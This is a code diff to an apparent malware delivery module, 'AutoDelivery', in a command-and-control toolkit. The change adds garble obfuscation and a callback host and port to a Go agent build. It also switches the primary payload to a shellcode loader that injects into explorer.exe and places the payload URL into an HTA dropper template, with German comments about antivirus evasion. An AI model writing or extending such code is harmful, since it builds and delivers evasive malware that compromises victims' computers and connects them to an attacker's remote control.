@@ -243,22 +243,27 @@ class AutoDelivery:
             from tools.c2.go_agent_builder import build, is_go_available
             if not is_go_available():
                 return None
-            exe, _ = build(self.token, self.chat_id, self.out, self.interval)
+            exe, log = build(self.token, self.chat_id, self.out, self.interval,
+                             use_garble=True, lhost=self.lhost, lport=self.port)
             return exe
         except Exception:
             return None
 
     def _write_files(self) -> list[tuple[str, str]]:
         files = []
-        exe_url  = f"{self._base_url()}/agent.exe"
         dat_url  = self._dat_url()
         loader   = _build_loader(dat_url, self._xor_key)
 
-        # ── Primär: Go-Binary (beste AV-Evasion) ──────────────────────────────
+        # ── Primär: Donut-Loader (Shellcode in explorer.exe) ──────────────────
         exe_path = self._build_go_agent()
         if exe_path:
-            size = os.path.getsize(exe_path)
-            files.append(("agent.exe", f"Go-Agent ({size:,} Bytes, XOR-obfuskiert)"))
+            fname    = os.path.basename(exe_path)   # loader.exe or agent.exe
+            exe_url  = f"{self._base_url()}/{fname}"
+            size     = os.path.getsize(exe_path)
+            is_loader = fname == "loader.exe"
+            desc = ("Shellcode-Loader → explorer.exe inject" if is_loader
+                    else f"Go-Agent garble+obf")
+            files.append((fname, f"{desc} ({size:,} Bytes)"))
             hta = _HTA_EXE_TEMPLATE.replace("{EXE_URL}", exe_url)
             self._use_exe = True
         else:
